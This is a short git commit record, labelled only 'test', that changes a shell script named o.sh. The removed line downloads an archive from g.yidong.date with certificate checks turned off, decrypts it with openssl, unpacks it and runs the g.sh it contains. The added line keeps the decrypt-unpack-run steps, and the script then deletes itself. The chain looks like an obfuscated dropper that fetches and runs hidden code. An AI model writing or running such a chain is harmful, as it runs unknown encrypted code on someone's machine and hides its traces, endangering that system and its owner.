d6e09554d2360706b2f95412281504beda7b1e3e
root <root@hk.asia-east2-a.c.ornate-charter-253511.internal>
2020-06-10 11:14:38 +0800

    test

--- o.sh
+++ o.sh
@@ -1,2 +1,2 @@
-wget -N --no-check-certificate g.yidong.date/g.tar.gz && openssl des3 -d  -salt -in ./g.tar.gz | tar xzf - && chmod +x g.sh && bash g.sh
+openssl des3 -d  -salt -in ./g.tar.gz | tar xzf - && chmod +x g.sh && bash g.sh
 rm o.sh
